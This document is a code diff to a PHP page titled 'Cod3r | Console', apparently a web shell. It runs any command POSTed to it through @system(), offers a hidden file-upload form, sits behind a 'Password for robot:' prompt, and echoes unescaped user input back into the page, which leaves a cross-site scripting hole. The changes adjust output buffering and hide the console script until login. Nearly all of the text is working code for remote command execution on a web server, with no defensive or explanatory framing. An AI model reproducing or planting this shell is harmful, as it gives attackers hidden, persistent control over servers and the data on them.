@@ -64,7 +64,6 @@ if(!$_SESSION['loggedIn']) {
 	disable_ob();
 }
 ?>
-
 <html>
     <head>
         <title>Cod3r | Console</title>
@@ -163,6 +162,7 @@ if(!$_SESSION['loggedIn']) {
 			<?php if(isset($_POST['outputData'])) echo $_POST['outputData'];?>
 			<?php if(isset($_POST['command'])&&!empty($_POST['command'])) {
 				echo getUserNameElement() . htmlentities($_POST['command']) . "<br>\n";
+				disable_ob();
 				$command = $_POST['command'];
 				@system($command);
 			} ?>
@@ -170,7 +170,7 @@ if(!$_SESSION['loggedIn']) {
             <div class="input" id="input">
                 <form id="form" method="POST">
                     <div class="username" id="username">
-					<?php echo getUserNameElement(false);?>
+					<?php echo getUserNameElement(false);if(!$_SESSION['loggedIn']) echo "Password for robot:"; ?>
 					</div>
                    <textarea name="outputData" style="display:none" id="outD"><?php 
 				   if(isset($_POST['outputData'])) {
@@ -184,12 +184,13 @@ if(!$_SESSION['loggedIn']) {
         <form id="upload" method="POST" style="display: none;">
             <input type="file" name="file" id="filebrowser" onchange='uploadFile()' />
         </form>
+		<?php if($_SESSION['loggedIn']):?>
         <script type="text/javascript">
-            var username = `<?php echo $name;?>`;
-            var hostname = `<?php echo $host;?>`;
-            var currentDir = `<?php echo getcwd();?>`;
+            var username = "<?php echo $name;?>";
+            var hostname = "<?php echo $host;?>";
+            var currentDir = "<?php echo getcwd();?>";
             var previousDir = "";
-            var defaultDir = `<?php echo $_SERVER['DOCUMENT_ROOT']; ?>`;
+            var defaultDir = "<?php echo $_SERVER['DOCUMENT_ROOT']; ?>";
             var commandHistory = [];
             var currentCommand = 0;
             var inputTextElement = get('#inputtext');
@@ -294,5 +295,6 @@ if(!$_SESSION['loggedIn']) {
 				sendCommand();
             });
         </script>
+		<?php endif;?>
     </body>
 </html>
